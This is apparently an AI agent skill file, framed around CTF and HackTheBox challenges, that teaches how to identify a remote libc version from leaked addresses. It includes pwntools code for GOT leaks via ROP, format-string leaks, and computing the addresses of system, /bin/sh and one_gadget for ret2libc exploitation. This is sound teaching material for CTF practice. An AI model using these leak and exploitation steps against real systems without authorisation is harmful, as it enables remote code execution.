---
name: Libc Identification
description: This skill should be used when the user asks to "identify libc", "find libc version", "libc database", "leak libc address", "determine libc", "fingerprint libc", or needs to identify the remote libc version from leaked addresses. Provides methodology for libc fingerprinting and offset calculation.
version: 1.0.0
---

# Libc Identification

## Overview

When exploiting remote binaries, the correct libc version is critical for calculating function offsets. This skill provides techniques for identifying libc versions from leaked addresses and calculating exploitation offsets.

## Why Libc Identification Matters

Different libc versions have different:
- Function offsets (system, execve)
- String locations (/bin/sh)
- Gadget availability (one_gadget)
- Internal structures (malloc hooks)

A leak of `puts` at `0x7f1234567890` means nothing without knowing which libc to calculate the base from.

## Identification Methods

### Method 1: Online Libc Database

**libc.blukat.me** (Recommended):

1. Leak at least 2 function addresses
2. Visit https://libc.blukat.me/
3. Enter function name and last 3 hex digits of address
4. Database returns matching libc versions

Example:
```
puts: 0x7f9876543210 → last 3 digits: 210
printf: 0x7f9876512340 → last 3 digits: 340
```

### Method 2: libc-database (Local)

```bash
# Clone libc-database
git clone https://github.com/niklasb/libc-database
cd libc-database

# Search by symbol offset
./find puts 210 printf 340

# Download identified libc
./download libc6_2.31-0ubuntu9_amd64
```

### Method 3: pwntools libcdb

```python
from pwn import *
from pwnlib.libcdb import search_by_symbol_offsets

# Search by leaked offsets
results = search_by_symbol_offsets({
    'puts': 0x210,
    'printf': 0x340
}, return_as_list=True)

for libc in results:
    print(f"Possible: {libc}")
```

## Leaking Libc Addresses

### Via GOT Leak

```python
from pwn import *

elf = ELF('./binary')
io = process('./binary')

# Leak puts@got using puts
pop_rdi = 0x401234
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

io.sendline(payload)
io.recvuntil(b'prompt')
leak = u64(io.recv(6).ljust(8, b'\x00'))
log.info(f"puts@libc: {hex(leak)}")
```

### Via Format String

```python
# Leak from stack - find libc return address
payload = b'%p ' * 30
io.sendline(payload)
leaks = io.recvline().decode().split()
# Analyze for libc-range addresses (0x7f...)
```

### Via puts Leftover

Some binaries leak addresses unintentionally when printing buffers that aren't null-terminated.

## Calculating Offsets

### Once Libc Identified

```python
from pwn import *

# Load identified libc
libc = ELF('./libc.so.6')

# Leaked puts address
puts_leak = 0x7f9876543210

# Calculate base
libc.address = puts_leak - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Now all symbols are correct
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
```

### Common Libc Symbols

```python
# Essential addresses
libc.symbols['system']
libc.symbols['execve']
libc.symbols['__free_hook']
libc.symbols['__malloc_hook']
libc.symbols['environ']  # Stack leak
next(libc.search(b'/bin/sh'))
```

## One Gadget Integration

After identifying libc:

```bash
one_gadget ./libc.so.6
```

Output example:
```
0xe3b2e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b31 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL
```

```python
# Use in exploit
one_gadget = libc.address + 0xe3b2e
# Ensure constraints are satisfied at call time
```

## Common Libc Versions (HTB)

Frequently encountered on HTB:

| Libc | Distribution |
|------|-------------|
| libc6_2.27-3ubuntu1_amd64 | Ubuntu 18.04 |
| libc6_2.31-0ubuntu9_amd64 | Ubuntu 20.04 |
| libc6_2.35-0ubuntu3_amd64 | Ubuntu 22.04 |
| libc-2.31.so | Generic glibc 2.31 |

## Pwntools Automatic Lookup

```python
from pwn import *

# Enable automatic libc lookup
context.log_level = 'debug'

# When you have a leak
io = remote('target', 1337)
# ... get leak ...

# Use DynELF for automatic resolution (slow but works)
d = DynELF(leak_function, elf=ELF('./binary'))
system = d.lookup('system', 'libc')
```

## Verification

Always verify libc identification:

```python
# Check multiple offsets match
assert (puts_leak & 0xfff) == (libc.symbols['puts'] & 0xfff)
assert (printf_leak & 0xfff) == (libc.symbols['printf'] & 0xfff)

# Verify base alignment (should be page-aligned)
assert libc.address & 0xfff == 0
```

## Output Format

```
## Libc Identification

### Leaked Addresses
- puts@libc: 0x7f9876543210 (offset: 0x210)
- printf@libc: 0x7f9876512340 (offset: 0x340)

### Identification Results
- Source: libc.blukat.me
- Match: libc6_2.31-0ubuntu9.7_amd64
- Confidence: 2/2 symbols matched

### Calculated Offsets
- libc base: 0x7f9876400000
- system: 0x7f987644f550
- /bin/sh: 0x7f98765a15aa
- one_gadget: 0x7f98764e3b2e

### Verification
- puts offset matches: YES (0x84210)
- Base is page-aligned: YES
```

## Troubleshooting

### Multiple Matches

If multiple libc versions match:
- Leak more function addresses
- Try each libc and test locally
- Check challenge hints for OS version

### No Matches

- Verify leak is correct (parse carefully)
- Try different offset bytes (last 3 vs 12 bits)
- May be custom/patched libc

### Remote Libc Different from Local

Use patchelf to test with correct libc locally:

```bash
# Download matching ld.so
patchelf --set-interpreter ./ld-2.31.so ./binary
patchelf --set-rpath . ./binary
# Now run with: LD_PRELOAD=./libc.so.6 ./binary
```

## Additional Resources

### References

- **`references/libc-database-usage.md`** - Detailed libc-database guide
- **`references/common-libcs.md`** - Common CTF libc versions and characteristics

### Online Tools

- https://libc.blukat.me/ - Online libc database
- https://libc.rip/ - Alternative database
- https://github.com/niklasb/libc-database - Local tool
